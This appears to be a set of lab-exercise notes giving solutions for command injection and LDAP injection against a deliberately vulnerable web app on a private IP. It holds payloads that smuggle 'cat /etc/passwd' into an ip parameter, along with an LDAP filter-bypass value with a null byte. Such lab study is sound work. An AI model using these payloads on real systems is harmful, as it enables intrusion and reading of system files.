# Phase III: Vulnerbility discovery & Exploitation
## Command Injection
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | 10.0.2.4+%26%26+cat+%2Fetc%2Fpasswd `10.0.2.4 && cat /etc/passwd`|
| example&nbsp;2 | 10.0.2.4%0A%26%26+cat+%2Fetc%2Fpasswd `10.0.2.4(New Line)&& cat /etc/passwd`|
| example&nbsp;3 | curl -X GET http://10.0.2.4/commandexec/example3.php?ip=10.0.2.4%0A%26%26+cat+%2Fetc%2Fpasswd |

## LDAP attacks
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | http://10.0.2.4/ldap/example1.php |
| example&nbsp;2 | http://10.0.2.4/ldap/example2.php?name=hacker)(cn=*))%00&password=1234 |